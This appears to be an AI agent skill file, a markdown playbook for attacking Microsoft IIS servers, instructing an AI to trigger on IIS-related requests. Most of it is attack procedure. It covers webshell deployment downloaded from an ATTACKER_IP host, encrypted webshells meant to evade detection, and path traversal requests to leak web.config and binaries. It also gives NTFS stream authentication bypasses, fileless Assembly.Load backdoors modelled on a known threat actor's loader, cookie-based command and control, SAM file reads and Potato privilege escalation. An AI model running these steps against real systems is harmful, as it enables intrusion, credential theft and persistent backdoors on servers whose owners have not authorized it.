---
name: iis-pentesting
description: IIS (Internet Information Services) pentesting and exploitation. Use this skill whenever the user mentions IIS, Microsoft web servers, ASPX, ASP.NET, .NET applications, web.config, trace.axd, Telerik, or any Microsoft Windows web server testing. This skill covers webshell deployment, path traversal, authentication bypass, configuration decryption, fileless backdoors, and known IIS vulnerabilities. Trigger for any IIS reconnaissance, exploitation, or post-exploitation tasks.
---

# IIS Pentesting Skill

A comprehensive guide for testing Microsoft Internet Information Services (IIS) web servers.

## Quick Start

```bash
# Check if target is IIS
curl -I http://target.com | grep -i "Microsoft-IIS"

# Test for common IIS vulnerabilities
python scripts/iis_enum.py http://target.com
```

## 1. IIS Discovery and Enumeration

### Identify IIS Server

Check the `Server` header for `Microsoft-IIS` version:

```bash
curl -I http://target.com
curl -I https://target.com
```

Look for:
- `Server: Microsoft-IIS/10.0`
- `X-Powered-By: ASP.NET`
- `X-AspNet-Version: 4.0.30319`

### Directory Bruteforce

Use the bundled IIS wordlist for discovery:

```bash
# Using the bundled wordlist
python scripts/iis_bruteforce.py http://target.com scripts/iis_wordlist.txt

# With common extensions
python scripts/iis_bruteforce.py http://target.com scripts/iis_wordlist.txt -e .aspx,.asp,.config,.aspx.gz
```

### Test Executable Extensions

IIS may execute these file types:
- `.asp` - Classic ASP
- `.aspx` - ASP.NET
- `.config` - Configuration files (can execute code)
- `.php` - If PHP handler is installed

## 2. Webshell Deployment

### ASPX Command Shell

If you have write access to `C:\inetpub\wwwroot`, deploy a webshell:

```powershell
# Upload webshell
iwr http://ATTACKER_IP/shell.aspx -OutFile C:\inetpub\wwwroot\shell.aspx

# Verify ACLs first
icacls C:\inetpub\wwwroot
```

### Generate Webshell

```bash
# Generate a basic ASPX webshell
python scripts/generate_webshell.py --output shell.aspx --type command

# Generate encrypted webshell (harder to detect)
python scripts/generate_webshell.py --output shell.aspx --type encrypted --key "your-secret-key"
```

### Access the Webshell

```bash
# Test webshell
curl "http://target.com/shell.aspx?cmd=whoami"

# With encrypted webshell
curl "http://target.com/shell.aspx?cmd=whoami&key=your-secret-key"
```

### Privilege Escalation Path

1. Webshell runs as AppPool identity (e.g., `IIS APPPOOL\DefaultAppPool`)
2. Check for `SeImpersonatePrivilege` on the token
3. If present, use Potato-family exploits (GodPotato, SigmaPotato) to escalate to SYSTEM

## 3. Path Traversal Attacks

### Leaking Source Code

IIS path traversal can expose sensitive files:

```bash
# Try accessing web.config
GET /download_page?id=..%2f..%2fweb.config HTTP/1.1
Host: target.com

# Access bin directory
GET /download_page?id=..%2f..%2fbin/WebApplication1.dll HTTP/1.1
Host: target.com

# Access global.asax (may contain passwords)
GET /download_page?id=..%2f..%2fglobal.asax HTTP/1.1
Host: target.com
```

### Common Sensitive Files

```bash
# Configuration files
GET /web.config
GET /connectionstrings.config
GET /global.asax

# View configs in MVC apps
GET /Views/web.config
GET /Areas/YourArea/Views/web.config
```

### Use the Path Traversal Script

```bash
python scripts/path_traversal.py http://target.com --vulnerable-param id
```

## 4. Authentication Bypass

### CVE-2022-30209 - Cached Password Bypass

IIS 10.0 has a hash collision vulnerability in cached authentication:

```bash
# Check if vulnerable
python scripts/cve_2022_30209.py --target http://target.com --username orange --password ZeeiJT

# The script will test hash collisions
# If vulnerable, you can authenticate with a different password that hashes to the same value
```

### Basic Authentication Bypass (IIS 7.5)

```bash
# Try NTFS alternate data streams
GET /admin:$i30:$INDEX_ALLOCATION/admin.php
GET /admin::$INDEX_ALLOCATION/admin.php
```

### ASPXAUTH Cookie Impersonation

If the target uses default ASPXAUTH settings:

1. Find a similar application using the same platform
2. Create a user with the same email as the target user
3. Use the cookie from the second server on the first

## 5. Internal IP Disclosure

### 302 Redirect Technique

Strip the Host header and use HTTP/1.0 to reveal internal IPs:

```bash
# Using netcat
nc -v target.com 80
GET / HTTP/1.0

# Using openssl for HTTPS
openssl s_client -connect target.com:443
GET / HTTP/1.0
```

Look for `Location: https://192.168.x.x/owa/` in the response.

### HTTPAPI 2.0 404 Error

If you see an HTTPAPI 2.0 404 error, the server didn't receive the correct Host header:

1. Check the SSL certificate for domain/subdomain names
2. Brute force VHosts until you find the correct one

## 6. Configuration Decryption

### ASP.NET Protected Configuration

Decrypt protected config sections with `aspnet_regiis`:

```cmd
# Decrypt by app path
%WINDIR%\Microsoft.NET\Framework64\v4.0.30319\aspnet_regiis.exe -pd "connectionStrings" -app "/MyApplication"

# Decrypt by physical path
%WINDIR%\Microsoft.NET\Framework64\v4.0.30319\aspnet_regiis.exe -pdf "connectionStrings" "C:\inetpub\wwwroot\MyApplication"
```

### ASP.NET Core Data Protection Keys

Look for key rings in:
- `%PROGRAMDATA%\Microsoft\ASP.NET\DataProtection-Keys`
- `HKLM\SOFTWARE\Microsoft\ASP.NET\Core\DataProtection-Keys`
- App-managed folders (e.g., `App_Data\keys`)

## 7. Fileless Backdoors

### NET-STAR Style Loaders

For advanced persistence, use in-memory .NET loaders:

```bash
# Generate a fileless loader
python scripts/generate_loader.py --output loader.aspx --payload payload.dll

# The loader will:
# 1. Decode Base64 payload
# 2. Decompress Gzip
# 3. Load via Assembly.Load()
# 4. Invoke entry point
```

### Cookie-Based C2

Use encrypted cookies for command and control:

```bash
# Send command via cookie
curl -c cookies.txt -b cookies.txt "http://target.com/loader.aspx?cmd=whoami"
```

## 8. Known Vulnerabilities

### Telerik UI WebResource.axd (CVE-2025-3600)

```bash
# Check for vulnerable Telerik endpoint
curl "http://target.com/Telerik.Web.UI.WebResource.axd?type=iec&dkey=1&prtype=System.Web.UI.Page%2c+System.Web"
```

### IIS Short Name Enumeration

```bash
# Use the bundled scanner
python scripts/iis_shortname.py http://target.com/path/

# Or use metasploit
use scanner/http/iis_shortname_scanner
```

### ASP.NET Trace.axd

```bash
# Check if trace.axd is enabled
curl http://target.com/trace.axd

# This may reveal:
# - Remote client IPs
# - Session IDs
# - Request/response cookies
# - Physical paths
# - Source code
# - Credentials
```

## 9. Common Sensitive File Paths

Use the bundled list for path traversal:

```bash
# Enumerate common sensitive files
python scripts/enum_sensitive_files.py http://target.com

# Or manually try:
C:\Windows\System32\config\SAM
C:\Windows\System32\config\SYSTEM
C:\Windows\repair\SAM
C:\inetpub\wwwroot\web.config
C:\xampp\php\php.ini
```

## 10. Post-Exploitation

### Check Application Pool Identity

```bash
# From webshell, check current identity
echo %USERDOMAIN%\%USERNAME%
whoami /all
```

### Check for SeImpersonatePrivilege

```powershell
# Check token privileges
whoami /priv | findstr SeImpersonatePrivilege
```

### Escalate with Potato Exploits

If `SeImpersonatePrivilege` is present:

```bash
# Use GodPotato or SigmaPotato
# These exploits require the privilege to escalate to SYSTEM
```

## Scripts Reference

| Script | Purpose |
|--------|--------|
| `iis_enum.py` | Basic IIS enumeration |
| `iis_bruteforce.py` | Directory bruteforce with IIS wordlist |
| `generate_webshell.py` | Create ASPX webshells |
| `path_traversal.py` | Test path traversal vulnerabilities |
| `cve_2022_30209.py` | Test CVE-2022-30209 hash collision |
| `generate_loader.py` | Create fileless .NET loaders |
| `iis_shortname.py` | IIS short name enumeration |
| `enum_sensitive_files.py` | Enumerate common sensitive files |

## Safety Notes

- Always have proper authorization before testing
- Webshells and exploits can be detected by antivirus
- Fileless techniques are harder to detect but require more skill
- Document all findings for the client
- Clean up any deployed webshells after testing

## References

- [HackTricks IIS Pentesting](https://book.hacktricks.xyz/pentesting-web/iis-internet-information-services)
- [CVE-2022-30209 Analysis](https://blog.orange.tw/2022/08/lets-dance-in-the-cache-destabilizing-hash-table-on-microsoft-iis.html)
- [Phantom Taurus / NET-STAR](https://unit42.paloaltonetworks.com/phantom-taurus/)
- [IIS Short Name Vulnerability](https://soroush.secproject.com/downloadable/microsoft_iis_tilde_character_vulnerability_feature.pdf)
